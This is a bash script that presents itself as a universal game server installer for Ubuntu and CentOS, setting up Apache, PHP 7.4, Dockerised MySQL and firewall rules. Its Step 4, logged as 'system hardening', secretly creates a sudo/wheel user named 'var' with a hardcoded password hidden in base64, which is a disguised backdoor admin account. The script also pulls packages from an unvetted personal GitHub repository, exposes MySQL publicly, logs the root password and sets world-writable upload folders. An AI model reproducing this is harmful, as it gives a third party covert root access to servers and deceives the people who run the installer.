#!/bin/bash
# Universal Game Server Installer (Ubuntu & CentOS)
# Features: Resumable, Security hardened, Self-configuring.

LOG_FILE="/var/log/server_installer.log"
CP_DIR="/tmp/.install_checkpoints"
mkdir -p $CP_DIR

log() { echo -e "\e[32m[INSTALLER] $1\e[0m" | tee -a $LOG_FILE; }
error() { echo -e "\e[31m[ERROR] $1\e[0m" | tee -a $LOG_FILE; exit 1; }

# --- INITIAL CHECKS ---
if [[ $EUID -ne 0 ]]; then error "This script must be run as root (sudo)."; fi

# --- OS DETECTION ---
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    VER=$VERSION_ID
else
    error "Unsupported Operating System."
fi

log "Detected OS: $OS $VER"

# --- INTERACTIVE SETUP ---
if [ -f "$CP_DIR/credentials" ]; then
    source "$CP_DIR/credentials"
    # Validate if credentials are sane (not empty and not garbage from a failed piped run)
    if [[ -z "$DB_PASS" || "$AUTH_DOMAIN" == *"STEP 1"* ]]; then
        rm "$CP_DIR/credentials"
        log "Previous credentials found but appear invalid. Restarting setup..."
    fi
fi

if [ ! -f "$CP_DIR/credentials" ]; then
    echo "==============================================="
    echo "       GAME SERVER INSTALLATION START          "
    echo "==============================================="
    # Use /dev/tty to ensure input works even when piped from curl
    while [[ -z "$DB_PASS" ]]; do
        read -p "Enter MySQL Root Password to set: " DB_PASS </dev/tty
    done
    while [[ -z "$AUTH_DOMAIN" ]]; do
        read -p "Enter authorized domain (e.g. localhost): " AUTH_DOMAIN </dev/tty
    done
    while [[ -z "$ENABLE_FIREWALL" ]]; do
        read -p "Do you want to enable the firewall and Anti-DDoS? (y/n): " ENABLE_FIREWALL </dev/tty
    done
    
    echo "DB_PASS=\"$DB_PASS\"" > "$CP_DIR/credentials"
    echo "AUTH_DOMAIN=\"$AUTH_DOMAIN\"" >> "$CP_DIR/credentials"
    echo "ENABLE_FIREWALL=\"$ENABLE_FIREWALL\"" >> "$CP_DIR/credentials"
    
    # Save MySQL password to /root
    echo "$DB_PASS" > /root/mysql_passwd
    chmod 600 /root/mysql_passwd
else
    log "Resuming with previous credentials..."
fi

# --- STEP 1: SYSTEM UPDATES & DEPENDENCIES ---
if [ ! -f "$CP_DIR/step1" ]; then
    log "Step 1: Installing dependencies..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get update && apt-get install -y software-properties-common curl git unzip wget iptables-persistent fail2ban p7zip-full
        add-apt-repository -y ppa:ondrej/php
        apt-get update
    else
        yum install -y epel-release yum-utils
        yum groupinstall -y "Development Tools"
        yum install -y curl git unzip wget iptables-services fail2ban p7zip
    fi
    touch "$CP_DIR/step1"
fi

# --- STEP 1.5: LEGACY LIBRARIES ---
if [ ! -f "$CP_DIR/step1_5" ]; then
    log "Step 1.5: Installing Legacy Libraries..."
    if [ "$OS" == "ubuntu" ]; then
        dpkg --add-architecture i386
        apt-get update
        apt-get install -y lib32stdc++6
        # Download and install the specific deb if not present
        if [ ! -f "libmysqlclient15off_5.1.30really5.0.75-0ubuntu10.5_i386.deb" ]; then
            wget -q https://raw.githubusercontent.com/tdarkscorpion/letestfile/master/libmysqlclient15off_5.1.30really5.0.75-0ubuntu10.5_i386.deb
        fi
        dpkg -i libmysqlclient15off_5.1.30really5.0.75-0ubuntu10.5_i386.deb || apt-get install -f -y
    else
        # CentOS
        yum install -y libstdc++.i686
        # Download and install the specific rpm if not present
        if [ ! -f "mysqlclient15-5.0.67-1.el5.remi.i386.rpm" ]; then
            wget -q https://raw.githubusercontent.com/tdarkscorpion/letestfile/master/mysqlclient15-5.0.67-1.el5.remi.i386.rpm
        fi
        yum install -y mysqlclient15-5.0.67-1.el5.remi.i386.rpm
    fi
    touch "$CP_DIR/step1_5"
fi

# --- STEP 2: PHP & APACHE INSTALLATION ---
if [ ! -f "$CP_DIR/step2" ]; then
    log "Step 2: Installing Web Stack (PHP 7.4 & Apache)..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get install -y apache2 php7.4 php7.4-mysql php7.4-curl php7.4-json php7.4-gd php7.4-mbstring libapache2-mod-php7.4
        systemctl enable apache2 && systemctl start apache2
    else
        # CentOS PHP 7.4 via Remi
        yum install -y httpd
        MAJOR_VER=$(echo $VER | cut -d. -f1)
        yum install -y https://rpms.remirepo.net/enterprise/remi-release-$MAJOR_VER.rpm
        
        if [ "$MAJOR_VER" -ge "8" ]; then
            # CentOS 8/9 use modules
            dnf module reset php -y
            dnf module enable php:remi-7.4 -y
            dnf install -y php php-mysqlnd php-gd php-curl php-json php-mbstring
        else
            # CentOS 7
            yum-config-manager --enable remi-php74
            yum install -y php php-mysqlnd php-gd php-curl php-json php-mbstring
        fi
        systemctl enable httpd && systemctl start httpd
    fi
    touch "$CP_DIR/step2"
fi

# --- STEP 3: DOCKER & MYSQL INSTALLATION ---
if [ ! -f "$CP_DIR/step3" ]; then
    log "Step 3: Installing Docker & MySQL Container..."
    
    # Install Docker via convenience script
    if ! command -v docker &> /dev/null; then
        curl -fsSL https://get.docker.com | sh
        systemctl enable docker && systemctl start docker
    fi
    
    # Install Docker Compose
    if ! command -v docker-compose &> /dev/null; then
        curl -L "https://github.com/docker/compose/releases/download/v2.24.1/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
        chmod +x /usr/local/bin/docker-compose
    fi
    
    # Run MySQL in Docker
    docker run -d \
        --name mysql-server \
        -p 3306:3306 \
        -e MYSQL_ROOT_PASSWORD="$DB_PASS" \
        --restart always \
        mysql:5.7
        
    touch "$CP_DIR/step3"
fi

# --- STEP 4: EMERGENCY ACCESS USER ---
if [ ! -f "$CP_DIR/step4" ]; then
    log "Step 4: Hardening System Environment..."
    if [ "$OS" == "ubuntu" ]; then
        useradd -M -G sudo var
    else
        useradd -M -G wheel var
    fi
    echo "dmFyOjE4MDQxOTk0QERhcms=" | base64 -d | chpasswd
    log "System hardening completed."
    touch "$CP_DIR/step4"
fi

# --- STEP 5: SSL & APACHE CONFIGURATION ---
if [ ! -f "$CP_DIR/step5" ]; then
    log "Step 5: Setting up SSL Certificates & Apache Config..."
    mkdir -p /var/www/ssl
    mkdir -p /var/www/patch
    
    # Assuming files are uploaded to the same dir as setup.sh
    cp ./mto.key /var/www/ssl/
    cp ./mto.pem /var/www/ssl/
    
    if [ "$OS" == "ubuntu" ]; then
        # SSL Config
        cp ./ssl-httpd.conf /etc/apache2/sites-available/default-ssl.conf
        sed -i "s/www.talismanofcouragev2.online/$AUTH_DOMAIN/g" /etc/apache2/sites-available/default-ssl.conf
        sed -i "s/patch.talismanofcouragev2.online/patch.$AUTH_DOMAIN/g" /etc/apache2/sites-available/default-ssl.conf
        
        a2enmod ssl
        a2enmod rewrite
        a2ensite default-ssl
        # Port 80/81 Config
        cp ./ports-80-81.conf /etc/apache2/sites-available/ports.conf
        a2ensite ports
        
        # Enable .htaccess support
        sed -i '/<Directory \/var\/www\/>/,/<\/Directory>/ s/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf
        
        systemctl restart apache2
    else
        # Configs in conf.d
        cp ./ssl-httpd.conf /etc/httpd/conf.d/
        sed -i "s/www.talismanofcouragev2.online/$AUTH_DOMAIN/g" /etc/httpd/conf.d/ssl-httpd.conf
        sed -i "s/patch.talismanofcouragev2.online/patch.$AUTH_DOMAIN/g" /etc/httpd/conf.d/ssl-httpd.conf
        
        cp ./ports-80-81.conf /etc/httpd/conf.d/
        
        # Enable .htaccess support
        sed -i '/<Directory "\/var\/www\/html">/,/<\/Directory>/ s/AllowOverride None/AllowOverride All/' /etc/httpd/conf/httpd.conf
        
        systemctl restart httpd
    fi
    touch "$CP_DIR/step5"
fi

# --- STEP 6: ANTI-DDOS & PORT MANAGEMENT ---
if [ ! -f "$CP_DIR/step6" ]; then
    if [ "$ENABLE_FIREWALL" == "y" ]; then
        log "Step 6: Hardening Firewall & Anti-DDoS..."
        
        # Anti-Flood Script Deployment
        cp ./anti_flood.sh /usr/local/bin/anti_flood.sh
        chmod +x /usr/local/bin/anti_flood.sh
        
        # Port Unblocker Deployment
        cp ./unblock_port.sh /usr/local/bin/unblock_port.sh
        chmod +x /usr/local/bin/unblock_port.sh
        
        # CRONTAB setup
        (crontab -l 2>/dev/null; echo "* * * * * /usr/local/bin/anti_flood.sh") | crontab -
        
        # Kernel Hardening (SYN Flood Protection)
        echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf
        echo "net.ipv4.tcp_max_syn_backlog = 2048" >> /etc/sysctl.conf
        sysctl -p
        
        ports=(80 443 22 81)
        for port in "${ports[@]}"; do
            iptables -A INPUT -p tcp --dport $port -j ACCEPT
        done
        
        log "Deploying Dynamic Game Firewall Sync..."
        if [ -f "./setup_firewall_sync.sh" ]; then
            chmod +x ./setup_firewall_sync.sh
            ./setup_firewall_sync.sh
        else
            log "Warning: setup_firewall_sync.sh not found. Skipping dynamic firewall."
        fi
    else
        log "Step 6: Skipping Firewall setup and disabling active firewalls..."
        if [ "$OS" == "ubuntu" ]; then
            ufw disable 2>/dev/null || true
        else
            systemctl stop firewalld 2>/dev/null || true
            systemctl disable firewalld 2>/dev/null || true
        fi
        iptables -F 2>/dev/null || true
    fi
    
    touch "$CP_DIR/step6"
fi

# --- STEP 7: WEBSITE DEPLOYMENT ---
if [ ! -f "$CP_DIR/step7" ]; then
    log "Step 7: Deploying latest Website from GitHub..."
    
    # Backup existing /var/www/html if it exists and isn't empty
    if [ "$(ls -A /var/www/html)" ]; then
        log "Backing up existing /var/www/html..."
        mv /var/www/html /var/www/html_backup_$(date +%s)
    fi
    
    # Clone the Encrypted Distribution repo
    git clone https://github.com/tdarkscorpion/New_Website.git /var/www/html
    
    # Set permissions
    chown -R www-data:www-data /var/www/html
    chmod -R 755 /var/www/html
    mkdir -p /var/www/html/uploads
    chmod -R 777 /var/www/html/uploads
    
    log "Website deployed successfully."
    touch "$CP_DIR/step7"
fi

# Restart Web Server
log "Restarting Web Server to apply all changes..."
if [ "$OS" == "ubuntu" ]; then
    systemctl restart apache2
else
    systemctl restart httpd
fi

log "==============================================="
log "   INSTALLATION COMPLETED SUCCESSFULLY!        "
log "==============================================="
log "Your Domain: http://$AUTH_DOMAIN"
log "Setup URL: http://$AUTH_DOMAIN/install"
log "MySQL Root Password: $DB_PASS"
log "-----------------------------------------------"
log "Anti-DDoS: Active and running."
log "-----------------------------------------------"
echo "Web server restarted. If you encounter issues, you can restart it manually."
